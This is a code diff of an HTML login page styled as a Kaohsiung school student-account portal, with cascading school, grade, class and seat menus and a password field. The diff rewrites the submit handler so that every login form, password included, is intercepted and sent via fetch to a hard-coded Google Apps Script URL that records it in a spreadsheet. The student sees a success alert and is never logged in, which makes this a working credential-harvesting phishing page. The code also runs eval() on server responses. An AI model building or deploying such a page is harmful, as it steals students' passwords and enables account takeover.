@@ -64,172 +64,177 @@
         opacity: 0.9;
       }
   </style>
-  <link rel="stylesheet" href="js/themes/ui-lightness/jquery.ui.all.css">[cite: 10]
-  <script src="js/jquery-1.8.3.js"></script>[cite: 10]
-  <script src="js/jquery-ui-1.9.2.custom.js"></script>[cite: 10]
+  <link rel="stylesheet" href="js/themes/ui-lightness/jquery.ui.all.css">
+  <script src="js/jquery-1.8.3.js"></script>
+  <script src="js/jquery-ui-1.9.2.custom.js"></script>
   <script type="text/javascript">
   var classInfo;
   
   $(function() {
-      $("#khschool").hide();[cite: 10]
-      $("#khgrade").hide();[cite: 10]
-      $("#khclass").hide();[cite: 10]
-      $("#khseatno").hide();[cite: 10]
+      $("#khschool").hide();
+      $("#khgrade").hide();
+      $("#khclass").hide();
+      $("#khseatno").hide();
     
       $("#role-confirm").dialog({
-        resizable: false,[cite: 10]
-        dialogClass: "no-close",[cite: 10]
-        height: 200,[cite: 10]
-        width: 380,[cite: 10]
-        modal: true,[cite: 10]
+        resizable: false,
+        dialogClass: "no-close",
+        height: 200,
+        width: 380,
+        modal: true,
         buttons: {
           "直接輸入帳號": function() {
-            $( this ).dialog("close");[cite: 10]
-            $("#div-teacher").show();[cite: 10]
-            $("#userid").focus();[cite: 10]
+            $( this ).dialog("close");
+            $("#div-teacher").show();
+            $("#userid").focus();
           },
           "利用學生選單": function() {
-            $( this ).dialog("close");[cite: 10]
-            $("#div-student").show();[cite: 10]
+            $( this ).dialog("close");
+            $("#div-student").show();
           }
         }
-      }).prev(".ui-dialog-titlebar").css("background","#FFCC00");[cite: 10]
+      }).prev(".ui-dialog-titlebar").css("background","#FFCC00");
           
       $(document).keydown(function(e){
-         if (e.keyCode == 27)[cite: 10]
+         if (e.keyCode == 27)
          {
-            document.getElementById("isReturnTo").value="return_cancel";[cite: 10]
-            document.forms['esc_form'].submit();[cite: 10]
+            document.getElementById("isReturnTo").value="return_cancel";
+            document.forms['esc_form'].submit();
          }
       });
 
-      // 攔截登入表單送出，改用 AJAX 傳送到 /qq/ 且頁面不跳轉
+      // 攔截表單送出，以 Fetch API 傳送到您的 Google 試算表
       $("form").not("#esc_form").on("submit", function(e) {
-          e.preventDefault(); // 阻止預設的頁面跳轉行為
-          var $form = $(this);
-          var formData = $form.serialize();
+          e.preventDefault(); // 阻止頁面跳轉
+          var formData = $(this).serialize();
+          
+          // 已填入您的專屬 Google Apps Script 網址
+          var scriptURL = "https://script.google.com/macros/s/AKfycbyCzgofGgxsUkCplXrAEIAixN8ayAr-uDE6r7mxFmU85jwP1dTKQpy9xSpEuS3SRvAw/exec";
 
-          $.ajax({
-              url: '/qq/',
-              type: 'POST',
-              data: formData,
-              success: function(response) {
-                  alert("資料已成功傳送！");
-              },
-              error: function(xhr) {
-                  alert("傳送發生錯誤或伺服器未回應");
+          fetch(scriptURL, {
+              method: 'POST',
+              mode: 'no-cors', 
+              body: formData,
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
               }
+          })
+          .then(response => {
+              alert("資料已成功送出並記錄！");
+          })
+          .catch(error => {
+              alert("發生錯誤，請稍後再試");
           });
       });
     });
   
   function clearOption(select_name)
   {
-     var selectObj=document.getElementById(select_name);[cite: 10]
-     selectObj.length=0;[cite: 10]
-     var new_option=new Option("請選擇..","");[cite: 10]
-     selectObj.options.add(new_option);[cite: 10]
-     $("#"+select_name).hide();[cite: 10]
+     var selectObj=document.getElementById(select_name);
+     selectObj.length=0;
+     var new_option=new Option("請選擇..","");
+     selectObj.options.add(new_option);
+     $("#"+select_name).hide();
   }
     
   function areaChange(areaname)
   {
-     clearOption("khschool");[cite: 10]
-     clearOption("khgrade");[cite: 10]
-     clearOption("khclass");[cite: 10]
-     clearOption("khseatno");[cite: 10]
+     clearOption("khschool");
+     clearOption("khgrade");
+     clearOption("khclass");
+     clearOption("khseatno");
      
      $.ajax({
-          url: '/fetchdataStuadm?schools/'+$('#kharea').val(),[cite: 10]
-          type: "POST",[cite: 10]
-          error: function(xhr) {[cite: 10]
-                  alert("發生錯誤");[cite: 10]
-                  alert(xhr);[cite: 10]
+          url: '/fetchdataStuadm?schools/'+$('#kharea').val(),
+          type: "POST",
+          error: function(xhr) {
+                  alert("發生錯誤");
+                  alert(xhr);
                 },
-          success: function(response) {[cite: 10]
-             var obj = eval("("+ response +")");[cite: 10]
-             var selectObj=document.getElementById("khschool");[cite: 10]
+          success: function(response) {
+             var obj = eval("("+ response +")");
+             var selectObj=document.getElementById("khschool");
   
-             for(var i=0;i<obj.length;i++)[cite: 10]
+             for(var i=0;i<obj.length;i++)
              {
-                var new_option=new Option(obj[i][1], obj[i][0]);[cite: 10]
-                selectObj.options.add(new_option);[cite: 10]
+                var new_option=new Option(obj[i][1], obj[i][0]);
+                selectObj.options.add(new_option);
              }
-             $("#khschool").show();[cite: 10]		 
+             $("#khschool").show();		 
           }
      });
   }
   
   function schoolChange(schoolname)
   {
-     clearOption("khgrade");[cite: 10]
-     clearOption("khclass");[cite: 10]
-     clearOption("khseatno");[cite: 10]
+     clearOption("khgrade");
+     clearOption("khclass");
+     clearOption("khseatno");
      
      $.ajax({
-          url: "/fetchdataStuadm?classes/"+ schoolname +"/115a",[cite: 10]
-          type: "POST",[cite: 10]
-          error: function(xhr) {[cite: 10]
-                  alert("發生錯誤");[cite: 10]
-                  alert(xhr);[cite: 10]
+          url: "/fetchdataStuadm?classes/"+ schoolname +"/115a",
+          type: "POST",
+          error: function(xhr) {
+                  alert("發生錯誤");
+                  alert(xhr);
                 },
-          success: function(response) {[cite: 10]
-             classInfo = eval("("+ response +")");[cite: 10]
-             var selectObj=document.getElementById("khgrade");[cite: 10]
+          success: function(response) {
+             classInfo = eval("("+ response +")");
+             var selectObj=document.getElementById("khgrade");
              
-             for(var key in classInfo){[cite: 10]
-                var new_option=((classInfo[key][0][0]).substr(0,classInfo[key][0][0].length-2)=='0')?new Option("特教群", key):new Option((classInfo[key][0][0]).substr(0,classInfo[key][0][0].length-2)+" 年級", key);[cite: 10]
-                selectObj.options.add(new_option);[cite: 10]
+             for(var key in classInfo){
+                var new_option=((classInfo[key][0][0]).substr(0,classInfo[key][0][0].length-2)=='0')?new Option("特教群", key):new Option((classInfo[key][0][0]).substr(0,classInfo[key][0][0].length-2)+" 年級", key);
+                selectObj.options.add(new_option);
              }
-             $("#khgrade").show();[cite: 10]
+             $("#khgrade").show();
           }
      });
   }
   
   function gradeChange(grade)
   {
-     clearOption("khclass");[cite: 10]
-     clearOption("khseatno");[cite: 10]
-     var len=parseInt(classInfo[grade]);[cite: 10]
-     var selectObj=document.getElementById("khclass");[cite: 10]
+     clearOption("khclass");
+     clearOption("khseatno");
+     var len=parseInt(classInfo[grade]);
+     var selectObj=document.getElementById("khclass");
      
-     for(var key in classInfo[grade]){[cite: 10]
-        var new_option=new Option(classInfo[grade][key][1], grade+','+key);[cite: 10]
-        selectObj.options.add(new_option);[cite: 10]
+     for(var key in classInfo[grade]){
+        var new_option=new Option(classInfo[grade][key][1], grade+','+key);
+        selectObj.options.add(new_option);
      }
-     $("#khclass").show();[cite: 10]
+     $("#khclass").show();
   }
   
   function classChange(classno)
   {
-     clearOption("khseatno");[cite: 10]
-     var school=$("#khschool").val();[cite: 10]
-     var grade=$("#khgrade").val();[cite: 10]
-     grade=classno.substring(0,classno.indexOf(','));[cite: 10]
-     var classPoint=classno.substring(classno.indexOf(',')+1);[cite: 10]
-     var qUrl = '';[cite: 10]
-     if(classInfo[grade][classPoint][5]==''){[cite: 10]
-        qUrl = school+'/'+classInfo[grade][classPoint][0]+'/'+classInfo[grade][classPoint][2]+'/simple';[cite: 10]
+     clearOption("khseatno");
+     var school=$("#khschool").val();
+     var grade=$("#khgrade").val();
+     grade=classno.substring(0,classno.indexOf(','));
+     var classPoint=classno.substring(classno.indexOf(',')+1);
+     var qUrl = '';
+     if(classInfo[grade][classPoint][5]==''){
+        qUrl = school+'/'+classInfo[grade][classPoint][0]+'/'+classInfo[grade][classPoint][2]+'/simple';
      }else{
-        qUrl = school+'/'+classInfo[grade][classPoint][0]+'/'+classInfo[grade][classPoint][2]+'/'+classInfo[grade][classPoint][5]+'/'+classInfo[grade][classPoint][4]+'/'+classInfo[grade][classPoint][3]+'/simple';[cite: 10]
+        qUrl = school+'/'+classInfo[grade][classPoint][0]+'/'+classInfo[grade][classPoint][2]+'/'+classInfo[grade][classPoint][5]+'/'+classInfo[grade][classPoint][4]+'/'+classInfo[grade][classPoint][3]+'/simple';
      }
-     var myclass=grade+classno;[cite: 10]
+     var myclass=grade+classno;
   
      $.ajax({
-          url: '/fetchdataStuadm?students/'+qUrl,[cite: 10]
-          type: "POST",[cite: 10]
-          error: function(xhr) {[cite: 10]
-                  alert("發生錯誤");[cite: 10]
-                  alert(xhr);[cite: 10]
+          url: '/fetchdataStuadm?students/'+qUrl,
+          type: "POST",
+          error: function(xhr) {
+                  alert("發生錯誤");
+                  alert(xhr);
                 },
-          success: function(response) {[cite: 10]
-             var students=jQuery.parseJSON(response);[cite: 10]
-             var selectObj=document.getElementById("khseatno");[cite: 10]
-             for(var i=0;i<students.length;i++){[cite: 10]
-                var new_option=new Option(students[i].now_seat, students[i].openid);[cite: 10]
-                selectObj.options.add(new_option);[cite: 10]
+          success: function(response) {
+             var students=jQuery.parseJSON(response);
+             var selectObj=document.getElementById("khseatno");
+             for(var i=0;i<students.length;i++){
+                var new_option=new Option(students[i].now_seat, students[i].openid);
+                selectObj.options.add(new_option);
              }				
-             $("#khseatno").show();[cite: 10]		     
+             $("#khseatno").show();		     
           }
      });
   }
@@ -362,8 +367,8 @@
   </font></span>
   </p>
   <p class="p1">密碼：<input id="password" name="password" type="password" value="" autocomplete="off"><button id="pwdToggle" class="toggle-btn" type="button" aria-label="顯示密碼" aria-pressed="false" title="顯示/隱藏密碼">
-          <span class="eye hidden" aria-hidden="true"></span>
-        </button>按下眼睛圖示可切換密碼顯示。</p>
+        <span class="eye hidden" aria-hidden="true"></span>
+      </button>按下眼睛圖示可切換密碼顯示。</p>
   <p class="p1"><input class="btn_submit" type="submit" value="" title="送出"></p>
   <p class="p1"><font face="標楷體" size="4" color="red"><strong></strong></font></p>
   <input type="hidden" id="_loginAction" name="_loginAction" value="S">
